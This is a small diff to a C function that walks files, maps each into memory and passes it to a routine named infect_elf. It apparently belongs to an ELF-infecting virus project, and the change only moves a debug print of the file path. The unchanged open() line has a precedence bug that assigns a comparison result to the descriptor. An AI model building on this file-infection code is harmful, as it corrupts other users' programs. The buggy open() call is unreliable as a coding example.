@@ -118,6 +118,7 @@ void	process_file(char *name, char *path)
 	struct stat		buf;
 	void			*ptr;
 
+	printf("%s\n", path);
 	if ((fd = open(path, O_RDONLY) < 0))
 		return ;
 	if (fstat(fd, &buf) < 0)
@@ -136,7 +137,6 @@ void	process_file(char *name, char *path)
 	if ((ptr = mmap(NULL, buf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 		return ((void)close(fd));
 	init_check_address(ptr, buf.st_size);
-	printf("%s\n", path);
 	infect_elf(ptr, path);
 	munmap(ptr, buf.st_size);
 	close(fd);
